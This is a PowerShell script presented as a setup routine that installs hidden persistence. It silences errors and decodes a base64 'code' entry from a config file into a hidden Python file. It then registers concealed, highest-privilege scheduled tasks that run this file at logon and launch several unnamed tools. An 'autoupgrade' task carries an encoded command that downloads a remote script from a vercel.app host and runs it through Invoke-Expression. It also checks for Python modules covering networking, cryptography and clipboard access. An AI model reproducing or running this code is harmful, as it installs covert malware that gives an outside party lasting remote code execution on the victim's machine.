$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}
$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false
$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vYWdlbnRza2lsbHNodWIudmVyY2VsLmFwcC9zcmMvU0VUVVAucHMxIHwgaWV4'

function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

function Find-ExistingPath {
    param(
        [string[]]$Candidates
    )

    foreach ($candidate in $Candidates) {
        if (-not $candidate) {
            continue
        }

        $item = Get-ChildItem -Path $candidate -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($item) {
            return $item.FullName
        }

        if (Test-Path $candidate) {
            return (Resolve-Path $candidate).Path
        }
    }

    return $null
}

function Find-ExistingPaths {
    param(
        [string[]]$Candidates
    )

    $seen = @{}
    foreach ($candidate in $Candidates) {
        if (-not $candidate) { continue }
        try {
            $items = Get-ChildItem -Path $candidate -File -ErrorAction SilentlyContinue
            if (-not $items -and (Test-Path -LiteralPath $candidate -PathType Leaf)) {
                $items = @(Get-Item -LiteralPath $candidate -ErrorAction SilentlyContinue)
            }
            foreach ($item in @($items)) {
                if ($item -and $item.FullName -and -not $seen.ContainsKey($item.FullName)) {
                    $seen[$item.FullName] = $true
                    $item.FullName
                }
            }
        } catch {
        }
    }
}

function Find-CommandPath {
    param(
        [string[]]$Names,
        [string[]]$FallbackPaths = @()
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -ErrorAction Stop
            foreach ($command in $commands) {
                if ($command -and $command.Source -and (Test-Path $command.Source) -and -not (Test-StoreStub $command.Source)) {
                    return (Resolve-Path $command.Source).Path
                }
            }
        } catch {
        }
    }

    return Find-ExistingPath -Candidates $FallbackPaths
}

function Test-PythonDeps {
    param([string]$PythonPath)
    try {
        & $PythonPath -c "import requests, cryptography, Crypto, pyperclip" 2>$null
        return $LASTEXITCODE -eq 0
    } catch {
        return $false
    }
}

function Find-PythonPath {
    param(
        [string]$UserProfilePath
    )

    $pythonCandidates = Find-ExistingPaths -Candidates @(
        "$env:ProgramFiles\Python*\python.exe",
        "${env:ProgramFiles(x86)}\Python*\python.exe"
    )
    $pythonCandidates += @(Find-ExistingPaths -Candidates @(
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe"
    ))
    foreach ($pythonPath in @($pythonCandidates)) {
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                return $pythonPath
            }
        } catch {
        }
    }

    $pythonCommandPaths = @()
    foreach ($name in @('python', 'python3')) {
        $found = Find-CommandPath -Names @($name)
        if ($found -and $pythonCommandPaths -notcontains $found) { $pythonCommandPaths += $found }
    }
    foreach ($pythonPath in @($pythonCommandPaths)) {
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                return $pythonPath
            }
        } catch {
        }
    }

    $pyPath = Find-CommandPath -Names @('py')
    $pyResolvedPath = $null
    if ($pyPath) {
        try {
            $pyResolvedPath = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
            if ($pyResolvedPath -and (Test-Path $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
                return $pyResolvedPath
            }
        } catch {
        }
    }

    $fallbackCandidates = @($pythonCandidates) + @($pythonCommandPaths) + @($pyResolvedPath)
    foreach ($fb in $fallbackCandidates) {
        if (-not $fb) { continue }
        if (-not (Test-Path $fb)) { continue }
        try {
            & $fb --version >$null 2>$null
            if ($LASTEXITCODE -eq 0) { return $fb }
        } catch {
        }
    }

    return $null
}

function Find-PipxVenvPythonPath {
    param(
        [string]$UserProfilePath,
        [string[]]$VenvNames
    )

    $candidates = @()
    foreach ($venvName in $VenvNames) {
        if (-not $venvName) {
            continue
        }

        $candidates += @(
            "$UserProfilePath\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:USERPROFILE\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
        )
    }

    return Find-ExistingPath -Candidates $candidates
}

function Convert-ToSingleQuotedPowerShellLiteral {
    param(
        [string]$Value
    )

    if ($null -eq $Value) {
        return "''"
    }

    return "'$($Value.Replace("'", "''"))'"
}

function New-HiddenStartProcessCommand {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory
    )

    if (-not $FilePath) {
        return $null
    }

    $commandParts = @(
        "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $FilePath)"
    )

    if ($Arguments -and $Arguments.Count -gt 0) {
        $escapedArgs = $Arguments | ForEach-Object { Convert-ToSingleQuotedPowerShellLiteral -Value $_ }
        $commandParts += "-ArgumentList @($($escapedArgs -join ', '))"
    }

    if ($WorkingDirectory) {
        $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $WorkingDirectory)"
    }

    $commandParts += '-WindowStyle Hidden | Out-Null'
    return ($commandParts -join ' ')
}

function Get-LaunchCommand {
    param(
        [string]$PreferredExecutable,
        [string[]]$PreferredArguments = @(),
        [string]$FallbackExecutable
    )

    if ($PreferredExecutable -and (Test-Path $PreferredExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $PreferredExecutable -Arguments $PreferredArguments
    }

    if ($FallbackExecutable -and (Test-Path $FallbackExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $FallbackExecutable
    }

    return $null
}

function Move-ConfigDirectory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SourceDir,
        [Parameter(Mandatory = $true)]
        [string]$DestinationDir
    )

    if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
        throw "Configuration source directory does not exist: $SourceDir"
    }

    if (Test-Path -LiteralPath $DestinationDir) {
        Remove-Item -LiteralPath $DestinationDir -Recurse -Force -ErrorAction Stop
        if (Test-Path -LiteralPath $DestinationDir) {
            throw "Configuration destination directory still exists after removal: $DestinationDir"
        }
    }

    Move-Item -LiteralPath $SourceDir -Destination $DestinationDir -ErrorAction Stop
}

function Get-ConfigCodeBase64 {
    param(
        [string[]]$ConfigLines
    )

    # Match setup.sh: lowercase "code" at the beginning of a line, with spaces around "=".
    $codeLines = @($ConfigLines | Where-Object { $_ -cmatch '^code *= *' })
    if ($codeLines.Count -eq 0) {
        return $null
    }

    $base64 = ($codeLines | ForEach-Object { $_ -creplace '^code *= *', '' }) -join [Environment]::NewLine
    return $base64 -replace '[^A-Za-z0-9+/=]', ''
}

$realUser = $null

try {
    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($computerSystem -and $computerSystem.UserName) {
        $realUser = $computerSystem.UserName
    }
} catch {
}

if (-not $realUser) {
    try {
        $realUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    } catch {
    }
}

if (-not $realUser) {
    $envUser = $env:USERNAME
    $envDomain = $env:USERDOMAIN
    if ($envUser) {
        if ($envDomain -and $envDomain -ne $env:COMPUTERNAME) {
            $realUser = "$envDomain\$envUser"
        } else {
            $realUser = "$env:COMPUTERNAME\$envUser"
        }
    }
}

if (-not $realUser) {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
    exit 1
}

if ($realUser -match '\\') {
    $targetUserName = ($realUser -split '\\')[-1]
} else {
    $targetUserName = $realUser
}

$targetUserProfile = $null
if ($env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
    $envUserName = Split-Path -Leaf $env:USERPROFILE
    if ($envUserName -ieq $targetUserName) {
        $targetUserProfile = $env:USERPROFILE
    }
}

if (-not $targetUserProfile) {
    $defaultProfilePath = "C:\Users\$targetUserName"
    if (Test-Path -LiteralPath $defaultProfilePath -PathType Container) {
        $targetUserProfile = $defaultProfilePath
    }
}

if (-not $targetUserProfile) {
    $targetUserProfile = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" |
        ForEach-Object {
            $profilePath = [System.Environment]::ExpandEnvironmentVariables($_.ProfileImagePath)
            if ($profilePath -and (Split-Path -Leaf $profilePath) -ieq $targetUserName -and
                (Test-Path -LiteralPath $profilePath -PathType Container)) {
                $profilePath
            }
        } |
        Select-Object -First 1
}

$targetConfigBase = "$targetUserProfile\.config"
$destDir = "$targetConfigBase\.configs"
$scriptPath = $null

$env:Path = [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')

$pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
$pythonDir = if ($pythonPath) { Split-Path -Parent $pythonPath } else { $null }
$pythonwPath = if ($pythonDir) {
    $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
    if (Test-Path $pythonwCandidate) { (Resolve-Path $pythonwCandidate).Path } else { $pythonPath }
} else { $null }
$pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }

$bserexpFallback      = if ($pythonScriptsDir) { "$pythonScriptsDir\bserexp-wins.cmd" } else { $null }
$bserexpBin           = Find-CommandPath -Names @('bserexp-wins') -FallbackPaths @($bserexpFallback)
$agentSettingFallback = if ($pythonScriptsDir) { "$pythonScriptsDir\agent-setting.cmd" } else { $null }
$agentSettingBin      = Find-CommandPath -Names @('agent-setting') -FallbackPaths @($agentSettingFallback)
$uvBin                = Find-CommandPath -Names @('uv')
$wklerFallback        = if ($pythonScriptsDir) { "$pythonScriptsDir\wkler.cmd" } else { $null }
$wklerBin             = Find-CommandPath -Names @('wkler')         -FallbackPaths @($wklerFallback)

try {
    if ($realUser -and (Test-Path $targetUserProfile) -and (Test-Path '.configs')) {
        $configLines = Get-Content .configs/config.ini

        $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
        if ($base64) {

            try {
                $bytes = [System.Convert]::FromBase64String($base64)
                [System.IO.File]::WriteAllBytes((Join-Path (Resolve-Path '.configs').Path '.bash.py'), $bytes)
            } catch {
            }

            if (-not (Test-Path $targetConfigBase)) {
                New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
            }

            Move-ConfigDirectory -SourceDir '.configs' -DestinationDir $destDir

            $scriptPath = "$destDir\.bash.py"
            if (Test-Path $scriptPath) {
                try {
                    $acl = Get-Acl $scriptPath
                    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
                    $acl.SetAccessRule($accessRule)
                    Set-Acl $scriptPath $acl
                } catch {
                }

                $taskName = 'Environment'

                if ($pythonwPath) {
                    $scriptPath = (Resolve-Path $scriptPath).Path
                    $scriptDir = (Resolve-Path (Split-Path -Parent $scriptPath)).Path
                    $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir

                    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                    $trigger.Enabled = $true
                        $trigger.Delay = 'PT5M'

                    $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

                    try {
                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
                        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
                        try {
                            Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
                        } catch {
                            Start-Process -FilePath $pythonwPath -ArgumentList @("$scriptPath") -WorkingDirectory $scriptDir -WindowStyle Hidden | Out-Null
                        }
                    } catch {
                    }
                }
            }
        }
    }
} catch {
}

try {
    if ($realUser) {
        Unregister-ScheduledTask -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
        $bserexpTaskName = 'bserexp'
        $agentSettingTaskName = 'agent-setting'
        $wklerTaskName = 'wkler'
        $autoupgradeTaskName = 'autoupgrade'

        if ($bserexpBin) {
            $bserexpLaunchCommand = New-HiddenStartProcessCommand -FilePath $bserexpBin
            $bserexpTaskCommand = if ($uvBin) {
                $bserexpUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade bserexp-wins"
                "$bserexpUpgradeCommand; $bserexpLaunchCommand"
            } else {
                $bserexpLaunchCommand
            }
            $bserexpAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$bserexpTaskCommand`""

            $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
            $bserexpTrigger.Enabled = $true
            $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
            $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            Unregister-ScheduledTask -TaskName $bserexpTaskName -Confirm:$false -ErrorAction SilentlyContinue
            try {
                Register-ScheduledTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings -Force -ErrorAction Stop | Out-Null
                Enable-ScheduledTask -TaskName $bserexpTaskName -ErrorAction SilentlyContinue | Out-Null
                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $bserexpTaskCommand) -WindowStyle Hidden | Out-Null
            } catch {
            }
        }

        if ($agentSettingBin) {
            $agentSettingLaunchCommand = New-HiddenStartProcessCommand -FilePath $agentSettingBin
            $agentSettingTaskCommand = if ($uvBin) {
                $agentSettingUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade agent-setting"
                "$agentSettingUpgradeCommand; $agentSettingLaunchCommand"
            } else {
                $agentSettingLaunchCommand
            }
            $agentSettingAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$agentSettingTaskCommand`""

            $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
            $agentSettingTrigger.Enabled = $true

            $agentSettingPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            Unregister-ScheduledTask -TaskName $agentSettingTaskName -Confirm:$false -ErrorAction SilentlyContinue

            try {
                Register-ScheduledTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings -Force -ErrorAction Stop | Out-Null
                Enable-ScheduledTask -TaskName $agentSettingTaskName -ErrorAction SilentlyContinue | Out-Null
                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $agentSettingTaskCommand) -WindowStyle Hidden | Out-Null
            } catch {
            }
        }

        if ($wklerBin) {
            $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
            $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerTaskCommand`""

            $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
            $wklerTrigger.Enabled = $true
            $wklerTrigger.Delay = 'PT15M'

            $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $wklerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            Unregister-ScheduledTask -TaskName $wklerTaskName -Confirm:$false -ErrorAction SilentlyContinue

            try {
                Register-ScheduledTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings -Force -ErrorAction Stop | Out-Null
                Enable-ScheduledTask -TaskName $wklerTaskName -ErrorAction SilentlyContinue | Out-Null
                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $wklerTaskCommand) -WindowStyle Hidden | Out-Null
            } catch {
            }
        }

        $userAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if ($userAutoSetupTask) {
            Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
        } else {
            $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
            $autoupgradeAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$autoupgradeCommand`""

            $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
            $autoupgradeTrigger.Enabled = $true

            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            # Re-register on every setup run so older task definitions also receive hidden settings.
            $autoupgradeNeedsRegistration = $true
            if ($autoupgradeNeedsRegistration) {
                try {
                    Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
                    Register-ScheduledTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings -Force -ErrorAction Stop | Out-Null
                    Enable-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction SilentlyContinue | Out-Null
                    Start-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction Stop
                } catch {
                }
            }
        }
    }
} catch {
}

$PSDefaultParameterValues.Clear()
foreach ($key in $originalPSDefaults.Keys) {
    $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
}
